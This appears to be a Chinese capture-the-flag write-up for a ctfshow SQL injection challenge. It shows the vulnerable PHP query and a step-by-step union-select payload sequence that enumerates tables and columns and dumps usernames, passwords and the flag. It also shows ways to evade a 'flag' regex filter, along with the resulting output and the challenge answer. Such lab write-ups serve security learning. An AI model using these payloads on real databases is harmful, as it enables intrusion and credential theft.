#### 链接

[https://blog.csdn.net/solitudi/article/details/110144623]: sql注入	"sql注入byY4tacker"
[https://blog.csdn.net/solitudi/article/details/109446561]: 
[https://www.cnblogs.com/tianyu0125/p/14006275.html]: 



查询语句

```mysql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```



返回逻辑

```php
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```



payload

```mysql
//判断注入
1' and 1=1--+

//判断字段
1' order by 3--+


//判段数据库
1' union select 1,database(),3--+
ctfshow_web

//判断table
1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctfshow_web'--+
ctfshow_user,ctfshow_user2
或者直接利用database()
1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
ctfshow_user,ctfshow_user2,ctfshow_user3

//判断字段
1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctfshow_user3'--+
id,username,password

//判断内容
1' union select 1,to_base64(username),to_base64(password) from ctfshow_user3--+

MYSQL中的base64方式和hex方式
hex数据用16进制转字符串就可以解码

1' union select to_base64(username),hex(password) from ctfshow_user3--+

admin							admin
YWRtaW4=(admin)					YWRtaW4=(admin)
dXNlcjE=(user1)					MTEx(111)
dXNlcjM=(user3)					MjIy(222)
dXNlckFVVE8=(userAUTO)			cGFzc3dvcmRBVVRP(passwordAUTO)
ZmxhZw==(flag)				ZmxhZ3s3MTNlZTUxNi02OWEzLTQ3ZjAtOGM4Ni04NmU2ZTA1ZWM2MDF9
							(flag{713ee516-69a3-47f0-8c86-86e6e05ec601})



使用right方法
从右开始截取字符串
right(str, length)，即：right(被截取字符串， 截取长度)
1' union select id,hex(username),right(password,40) from ctfshow_user3 -- -
1' union select 1,to_base64(username),right(password,41) from ctfshow_user3 -- -

admin			admin
YWRtaW4=		admin
dXNlcjE=		111
dXNlcjM=		222
dXNlckFVVE8=	passwordAUTO
ZmxhZw==		lag{713ee516-69a3-47f0-8c86-86e6e05ec601}

只要正则没有完全匹配到flag就可以


使用substring方法

substring(str, pos)，即：substring(被截取字符串， 从第几位开始截取)
substring(str, pos, length)，即：substring(被截取字符串，从第几位开始截取，截取长度)


1' union select 1,to_base64(username),substring(password,2) from ctfshow_user3--+

admin			admin
YWRtaW4=		admin
dXNlcjE=		111
dXNlcjM=		222
dXNlckFVVE8=	passwordAUTO
ZmxhZw==		lag{713ee516-69a3-47f0-8c86-86e6e05ec601}


使用substring_index方法
substring_index(str, delim, count)，即：substring_index(被截取字符串，关键字，关键字出现的次数)

相当于截取倒数第1个“{”之后的所有字符
flag{*****}
1' union select 1,to_base64(username),substring_index(password,'{',-1) from ctfshow_user3 --+

admin			admin
YWRtaW4=		admin
dXNlcjE=		111
dXNlcjM=		222
dXNlckFVVE8=	passwordAUTO
ZmxhZw==		713ee516-69a3-47f0-8c86-86e6e05ec601}
```

